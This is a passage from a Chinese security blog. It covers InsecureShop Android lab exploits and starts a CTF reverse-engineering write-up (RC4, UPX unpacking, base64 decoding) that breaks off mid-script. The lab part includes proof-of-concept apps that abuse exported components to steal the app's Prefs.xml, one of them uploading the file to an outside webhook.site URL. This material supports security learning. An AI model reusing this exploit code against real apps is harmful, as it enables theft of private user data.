&#123;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (len != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">it</span> <span class="operator">=</span> len.intValue();</span><br><span class="line">                    <span class="keyword">if</span> (openOutputStream != <span class="literal">null</span>) &#123;</span><br><span class="line">                        openOutputStream.write(bArr, <span class="number">0</span>, it);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">getFilename</span><span class="params">(Uri uri)</span> &#123;</span><br><span class="line">        Intrinsics.checkParameterIsNotNull(uri, <span class="string">&quot;uri&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> (String) <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> getApplicationContext();</span><br><span class="line">        <span class="type">String</span> <span class="variable">scheme</span> <span class="operator">=</span> uri.getScheme();</span><br><span class="line">        <span class="keyword">if</span> (Intrinsics.areEqual(scheme, <span class="string">&quot;file&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> uri.getLastPathSegment();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (Intrinsics.areEqual(scheme, <span class="string">&quot;content&quot;</span>)) &#123;</span><br><span class="line">            String[] proj = &#123;<span class="string">&quot;_display_name&quot;</span>&#125;;</span><br><span class="line">            Intrinsics.checkExpressionValueIsNotNull(context, <span class="string">&quot;context&quot;</span>);</span><br><span class="line">            <span class="type">Cursor</span> <span class="variable">cursor</span> <span class="operator">=</span> context.getContentResolver().query(uri, proj, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">if</span> (cursor != <span class="literal">null</span> &amp;&amp; cursor.getCount() != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">columnIndex</span> <span class="operator">=</span> cursor.getColumnIndexOrThrow(<span class="string">&quot;_display_name&quot;</span>);</span><br><span class="line">                cursor.moveToFirst();</span><br><span class="line">                <span class="keyword">return</span> cursor.getString(columnIndex);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> fileName;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fileName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;```</span><br><span class="line"></span><br><span class="line">代码有点长，但我们来逐步解析，从 Intent 开始：</span><br><span class="line"></span><br><span class="line">- 检查 Intent 是否有额外的数据，并特别查找键为 `android.intent.extra.STREAM` 的额外数据。</span><br><span class="line">- **`<span class="type">Parcelable</span> <span class="variable">parcelableExtra</span> <span class="operator">=</span> getIntent().getParcelableExtra(<span class="string">&quot;android.intent.extra.STREAM&quot;</span>)`**: 从 Intent 中获取键为</span><br><span class="line">  `android.intent.extra.STREAM` 的 Parcelable 额外数据。这通常用于在组件之间传递复杂的数据。</span><br><span class="line">- **`<span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.fromFile(<span class="keyword">new</span> <span class="title class_">File</span>(((Uri) parcelableExtra).toString()))`**: 将 Parcelable 对象（应该是一个 `Uri`）转换为</span><br><span class="line">  `File` 对象，然后从该文件创建一个 `Uri`。这一行假设 Parcelable 额外数据是一个表示文件路径的 `Uri`。</span><br><span class="line">- 创建文件的临时副本，并使用 `makeTempCopy` 处理它。</span><br><span class="line"></span><br><span class="line">接下来是 **`makeTempCopy()`** 方法：</span><br><span class="line"></span><br><span class="line">- 创建由 `Uri` 指定的文件的临时副本。</span><br><span class="line">- 它读取原始文件的内容，并将其写入外部存储目录 (`/sdcard/insecureshop/`) 中的新文件。</span><br><span class="line"></span><br><span class="line">再来看 **`getFilename()`** 方法：</span><br><span class="line"></span><br><span class="line">- 该方法从 `Uri` 中确定文件名。</span><br><span class="line"></span><br><span class="line">基于以上信息，我们来创建一个示例的利用程序，以下代码将复制 `Prefs.xml` 文件作为一个例子：</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    <span class="type">Button</span> <span class="variable">TheftofArbitraryFilesButton</span> <span class="operator">=</span> (Button) findViewById(R.id.TheftofArbitraryFiles);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set a click listener to send the intent</span></span><br><span class="line">    TheftofArbitraryFilesButton.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">StealingFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        <span class="comment">// Selecting the ChooserActivity</span></span><br><span class="line">        StealingFile.setClassName(<span class="string">&quot;com.insecureshop&quot;</span>, <span class="string">&quot;com.insecureshop.ChooserActivity&quot;</span>);</span><br><span class="line">        <span class="comment">// Specfiying the Prefs.xml file</span></span><br><span class="line">        <span class="type">Uri</span> <span class="variable">FileName</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;/data/data/com.insecureshop/shared_prefs/Prefs.xml&quot;</span>);</span><br><span class="line">        <span class="comment">// adding the EXTRA_STREAM as an extra to trigger the exported Intent</span></span><br><span class="line">        StealingFile.putExtra(StealingFile.EXTRA_STREAM, FileName);</span><br><span class="line">        <span class="comment">// Starting the Intent</span></span><br><span class="line">        startActivity(StealingFile);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并没有复现成功</p><p><img src="/../imgs/183e7c086b3081bf800fe3e88ab4f232/Pulrgximageimage_6FKLgC2yfC.png" alt="183e7c086b3081bf800fe3e88ab4f232&#x2F;Pulrgximageimage_6FKLgC2yfC.png"></p><h2 id="使用具有已知漏洞的组件"><a href="#使用具有已知漏洞的组件" class="headerlink" title="使用具有已知漏洞的组件"></a><strong>使用具有已知漏洞的组件</strong></h2><p>识别应用程序中使用的易受攻击的组件或库，这些组件或库可能允许您将本地文件泄露到远程域。</p><p>看起来该应用程序包含一个名为 <code>net.gotev.uploadservice</code> 的易受攻击的上传服务库，并且它在 <code>androidManfiest.xml</code>中被导出了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;service android:name=<span class="string">&quot;net.gotev.uploadservice.UploadService&quot;</span> android:enabled=<span class="string">&quot;true&quot;</span> android:exported=<span class="string">&quot;true&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>在HackerOne上有一份公开报告利用了这项服务：</p><p>[ HackerOne &gt; On the newest Androids it also can be exploited via Instant Apps directly from a web-browser (installation of an app is not required).It actually was a mistake, services can be accessed by Instant A <a href="https://hackerone.com/reports/258460]">https://hackerone.com/reports/258460]</a>(<a href="https://hackerone.com/reports/258460">https://hackerone.com/reports/258460</a> ”<br>HackerOne &gt; On the newest Androids it also can be exploited via Instant Apps directly from a web-browser (installation<br>of an app is not required).It actually was a mistake, services can be accessed by Instant<br>A <a href="https://hackerone.com/reports/258460%E2%80%9D">https://hackerone.com/reports/258460”</a>)</p><p>报告中提到，由于该服务被导出，它允许安装在同一设备上的任何应用程序使用它来从易受攻击的应用程序目录中窃取任何文件，在我们的情况下是<br><code>/data/data/com.insecureshop</code>。我将创建一个新的漏洞利用应用程序，并将易受攻击的库代码添加到我的漏洞利用应用程序中。以下是在Insecureapp中使用的易受攻击版本<br><code>android-upload-service-3.2.3</code>的链接：</p><p><a href="https://github.com/gotev/android-upload-service/releases?page=4">https://github.com/gotev/android-upload-service/releases?page=4</a></p><p>首先，你需要通过编辑 settings.gradle 文件并将依赖项添加到 build.gradle 文件中，将这个库导入到你的代码中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">dependencyResolutionManagement &#123;</span><br><span class="line">repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)</span><br><span class="line">repositories &#123;</span><br><span class="line">    google()</span><br><span class="line">    mavenCentral()</span><br><span class="line">    maven &#123; url <span class="string">&#x27;https://jitpack.io&#x27;</span> &#125;</span><br><span class="line">    jcenter() <span class="comment">// Warning: this repository is going to shut down soon</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">rootProject.name = <span class="string">&quot;gotevUploadServiceExploit&quot;</span></span><br><span class="line">include <span class="string">&#x27;:app&#x27;</span>```</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line">dependencies</span><br><span class="line">&#123;</span><br><span class="line">    implementation <span class="string">&#x27;com.github.gotev.android-upload-service:uploadservice:3.2.3&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，点击同步Gradle，然后修改Hackerone研究人员提供的POC，尝试窃取<code>Prefs.xml</code>文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.insecureshopapp.gotevuploadserviceexploit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> net.gotev.uploadservice.HttpUploadTaskParameters;</span><br><span class="line"><span class="keyword">import</span> net.gotev.uploadservice.UploadFile;</span><br><span class="line"><span class="keyword">import</span> net.gotev.uploadservice.UploadTaskParameters;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">    <span class="type">UploadTaskParameters</span> <span class="variable">params</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UploadTaskParameters</span>();</span><br><span class="line">    <span class="comment">// Random Id parameter</span></span><br><span class="line">    params.setId(<span class="string">&quot;18888998&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Any Server URL to receive the local file</span></span><br><span class="line">    params.setServerUrl(<span class="string">&quot;http://webhook.site/4f08c75a-a478-4f6f-93bb-2ee8eba6fa4b&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        params.addFile(<span class="keyword">new</span> <span class="title class_">UploadFile</span>(<span class="string">&quot;/data/data/com.insecureshop/shared_prefs/Prefs.xml&quot;</span>));</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;net.gotev.uploadservice.action.upload&quot;</span>);</span><br><span class="line">        intent.setClassName(<span class="string">&quot;com.insecureshop&quot;</span>, <span class="string">&quot;net.gotev.uploadservice.UploadService&quot;</span>);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;taskClass&quot;</span>, <span class="string">&quot;net.gotev.uploadservice.MultipartUploadTask&quot;</span>);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;multipartUtf8Charset&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;httpTaskParameters&quot;</span>, <span class="keyword">new</span> <span class="title class_">HttpUploadTaskParameters</span>());</span><br><span class="line">        intent.putExtra(<span class="string">&quot;taskParameters&quot;</span>, params);</span><br><span class="line">        startService(intent);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 移动安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第七届浙江省大学生网络与信息安全竞赛决赛 Reverse</title>
      <link href="/2024/11/18/%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B%20Reverse/"/>
      <url>/2024/11/18/%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B%20Reverse/</url>
      
        <content type="html"><![CDATA[<h2 id="Reverse1"><a href="#Reverse1" class="headerlink" title="Reverse1"></a>Reverse1</h2><p>反编译后得到</p><p><img src="/../imgs/%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B%20Reverse%20142e7c086b30803b910bfe26aa5c6097/image.png" alt="image.png"></p><p>首先看初始化函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">int</span> init(EVP_PKEY_CTX *ctx)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  EVP_PKEY_CTX EVar1;</span><br><span class="line">  long lVar2;</span><br><span class="line">  ulong in_RDX;</span><br><span class="line">  long in_RSI;</span><br><span class="line">  uint *puVar3;</span><br><span class="line">  long in_FS_OFFSET;</span><br><span class="line">  <span class="built_in">int</span> local_424;</span><br><span class="line">  <span class="built_in">int</span> local_420;</span><br><span class="line">  <span class="built_in">int</span> local_41c;</span><br><span class="line">  uint local_418 [<span class="number">258</span>];</span><br><span class="line">  long local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(long *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  puVar3 = local_418;</span><br><span class="line">  <span class="keyword">for</span> (lVar2 = <span class="number">0x80</span>; lVar2 != <span class="number">0</span>; lVar2 = lVar2 + -<span class="number">1</span>) &#123;</span><br><span class="line">    puVar3[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    puVar3[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    puVar3 = puVar3 + <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (local_424 = <span class="number">0</span>; local_424 &lt; <span class="number">256</span>; local_424 = local_424 + <span class="number">1</span>) &#123;</span><br><span class="line">    ctx[local_424] = SUB41(local_424,<span class="number">0</span>);</span><br><span class="line">    local_418[local_424] = (uint)*(byte *)(in_RSI + (ulong)(long)local_424 % in_RDX);</span><br><span class="line">  &#125;</span><br><span class="line">  local_420 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (local_41c = <span class="number">0</span>; local_41c &lt; <span class="number">256</span>; local_41c = local_41c + <span class="number">1</span>) &#123;</span><br><span class="line">    local_420 = (<span class="built_in">int</span>)((uint)(byte)ctx[local_41c] + local_420 + local_418[local_41c]) % <span class="number">0x100</span>;</span><br><span class="line">    EVar1 = ctx[local_41c];</span><br><span class="line">    ctx[local_41c] = ctx[local_420];</span><br><span class="line">    ctx[local_420] = EVar1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (local_10 != *(long *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    /* WARNING: Subroutine does <span class="keyword">not</span> <span class="keyword">return</span> */</span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里是实现了一个RC4流密码的初始化</p><h2 id="Reverse2"><a href="#Reverse2" class="headerlink" title="Reverse2"></a>Reverse2</h2><p><a href="../imgs/%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B%20Reverse%20142e7c086b30803b910bfe26aa5c6097/Reverse2.exe.zip">Reverse2.exe.zip</a></p><p>使用反编译工具打开附件发现，反编译出没有什么有用的函数，通过分析发现程序加壳了</p><p>![image.png](..&#x2F;imgs&#x2F;第七届浙江省大学生网络与信息安全竞赛决赛%20Reverse%20142e7c086b30803b910bfe26aa5c6097&#x2F;image 1.png)</p><p>把<code>ABC</code> 修改为<code>UPX</code> 进行脱壳</p><p>![image.png](..&#x2F;imgs&#x2F;第七届浙江省大学生网络与信息安全竞赛决赛%20Reverse%20142e7c086b30803b910bfe26aa5c6097&#x2F;image 2.png)</p><p>脱壳后可以正常进行反编译，在代码中发现，base64的字母表</p><p>![image.png](..&#x2F;imgs&#x2F;第七届浙江省大学生网络与信息安全竞赛决赛%20Reverse%20142e7c086b30803b910bfe26aa5c6097&#x2F;image 3.png)</p><p>编码后的数据</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">  local_138[<span class="number">0x30</span>] = <span class="number">0x6d</span>;</span><br><span class="line">local_138[<span class="number">0x31</span>] = <span class="number">0x6f</span>;</span><br><span class="line">local_138[<span class="number">0x32</span>] = <span class="number">0x4c</span>;</span><br><span class="line">local_138[<span class="number">0x33</span>] = <span class="number">0x3d</span>;</span><br><span class="line">local_138[<span class="number">0</span>] = <span class="number">0x75</span>;</span><br><span class="line">local_138[<span class="number">1</span>] = <span class="number">0x37</span>;</span><br><span class="line">local_138[<span class="number">2</span>] = <span class="number">0x36</span>;</span><br><span class="line">local_138[<span class="number">3</span>] = <span class="number">0x73</span>;</span><br><span class="line">local_138[<span class="number">4</span>] = <span class="number">0x76</span>;</span><br><span class="line">local_138[<span class="number">5</span>] = <span class="number">0x4b</span>;</span><br><span class="line">local_138[<span class="number">6</span>] = <span class="number">0x75</span>;</span><br><span class="line">local_138[<span class="number">7</span>] = <span class="number">0x35</span>;</span><br><span class="line">local_138[<span class="number">8</span>] = <span class="number">0x68</span>;</span><br><span class="line">local_138[<span class="number">9</span>] = <span class="number">0x4a</span>;</span><br><span class="line">local_138[<span class="number">10</span>] = <span class="number">0x76</span>;</span><br><span class="line">local_138[<span class="number">0xb</span>] = <span class="number">0x4c</span>;</span><br><span class="line">local_138[<span class="number">0xc</span>] = <span class="number">0x7a</span>;</span><br><span class="line">local_138[<span class="number">0xd</span>] = <span class="number">0x70</span>;</span><br><span class="line">local_138[<span class="number">0xe</span>] = <span class="number">0x76</span>;</span><br><span class="line">local_138[<span class="number">0xf</span>] = <span class="number">0x48</span>;</span><br><span class="line">local_138[<span class="number">0x34</span>] = <span class="number">0</span>;</span><br><span class="line">local_138[<span class="number">0x10</span>] = <span class="number">0x6e</span>;</span><br><span class="line">local_138[<span class="number">0x11</span>] = <span class="number">0x4a</span>;</span><br><span class="line">local_138[<span class="number">0x12</span>] = <span class="number">0x76</span>;</span><br><span class="line">local_138[<span class="number">0x13</span>] = <span class="number">0x47</span>;</span><br><span class="line">local_138[<span class="number">0x14</span>] = <span class="number">0x78</span>;</span><br><span class="line">local_138[<span class="number">0x15</span>] = <span class="number">0x35</span>;</span><br><span class="line">local_138[<span class="number">0x16</span>] = <span class="number">0x6e</span>;</span><br><span class="line">local_138[<span class="number">0x17</span>] = <span class="number">0x50</span>;</span><br><span class="line">local_138[<span class="number">0x18</span>] = <span class="number">0x7a</span>;</span><br><span class="line">local_138[<span class="number">0x19</span>] = <span class="number">0x35</span>;</span><br><span class="line">local_138[<span class="number">0x1a</span>] = <span class="number">0x33</span>;</span><br><span class="line">local_138[<span class="number">0x1b</span>] = <span class="number">0x4e</span>;</span><br><span class="line">local_138[<span class="number">0x1c</span>] = <span class="number">0x7a</span>;</span><br><span class="line">local_138[<span class="number">0x1d</span>] = <span class="number">0x38</span>;</span><br><span class="line">local_138[<span class="number">0x1e</span>] = <span class="number">0x75</span>;</span><br><span class="line">local_138[<span class="number">0x1f</span>] = <span class="number">0x61</span>;</span><br><span class="line">local_138[<span class="number">0x20</span>] = <span class="number">0x78</span>;</span><br><span class="line">local_138[<span class="number">0x21</span>] = <span class="number">0x73</span>;</span><br><span class="line">local_138[<span class="number">0x22</span>] = <span class="number">0x66</span>;</span><br><span class="line">local_138[<span class="number">0x23</span>] = <span class="number">0x47</span>;</span><br><span class="line">local_138[<span class="number">0x24</span>] = <span class="number">0x78</span>;</span><br><span class="line">local_138[<span class="number">0x25</span>] = <span class="number">0x73</span>;</span><br><span class="line">local_138[<span class="number">0x26</span>] = <span class="number">0x65</span>;</span><br><span class="line">local_138[<span class="number">0x27</span>] = <span class="number">0x61</span>;</span><br><span class="line">local_138[<span class="number">0x28</span>] = <span class="number">0x6e</span>;</span><br><span class="line">local_138[<span class="number">0x29</span>] = <span class="number">0x4a</span>;</span><br><span class="line">local_138[<span class="number">0x2a</span>] = <span class="number">0x6e</span>;</span><br><span class="line">local_138[<span class="number">0x2b</span>] = <span class="number">0x48</span>;</span><br><span class="line">local_138[<span class="number">0x2c</span>] = <span class="number">0x79</span>;</span><br><span class="line">local_138[<span class="number">0x2d</span>] = <span class="number">0x38</span>;</span><br><span class="line">local_138[<span class="number">0x2e</span>] = <span class="number">0x33</span>;</span><br><span class="line">local_138[<span class="number">0x2f</span>] = <span class="number">0x49</span>;</span><br></pre></td></tr></table></figure><p>解码代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">local_138 = [<span class="number">0</span>] * <span class="number">0x35</span></span><br><span class="line"><span class="comment">## 初始化 local_138</span></span><br><span class="line">local_138[<span class="number">0x30</span>] = <span class="number">0x6d</span></span><br><span class="line">local_138[<span class="number">0x31</span>] = <span class="number">0x6f</span></span><br><span class="line">local_138[<span class="number">0x32</span>] = <span class="number">0x4c</span></span><br><span class="line">local_138[<span class="number">0x33</span>] = <span class="number">0x3d</span></span><br><span class="line">local_138[<span class="number">0</span>] = <span class="number">0x75</span></span><br><span class="line">local_138[<span class="number">1</span>] = <span class="number">0x37</span></span><br><span class="line">local_138[<span class="number">2</span>] = <span class="number">0x36</span></span><br><span class="line">local_138[<span class="number">3</span>] = <span class="number">0x73</span></span><br><span class="line">local_138[<span class="number">4</span>] = <span class="number">0x76</span></span><br><span class="line">local_138[<span class="number">5</span>] = <span class="number">0x4b</span></span><br><span class="line">local_138[<span class="number">6</span>] = <span class="number">0x75</span></span><br><span class="line">local_138[<span class="number">7</span>] = <span class="number">0x35</span></span><br><span class="line">local_138[<span class="number">8</span>] = <span class="number">0x68</span></span><br><span class="line">local_138[<span class="number">9</span>] = <span class="number">0x4a</span></span><br><span class="line">local_138[<span class="number">10</span>] = <span class="number">0x76</span></span><br><span class="line">local_138[<span class="number">0xb</span>] = <span class="number">0x4c</span></span><br><span class="line">local_138[<span class="number">0xc</span>] = <span class="number">0x7a</span></span><br><span class="line">local_138[<span class="number">0xd</span>] = <span class="number">0x70</span></span><br><span class="line">local_138[<span class="number">0xe</span>] = <span class="number">0x76</span></span><br><span class="line">local_138[<span class="number">0xf</span>] = <span class="number">0x48</span></span><br><span class="line">local_138[<span class="number">0x34</span>] = <span class="number">0</span></span><br><span class="line">local_138[<span class="number">0x10</span>] = <span 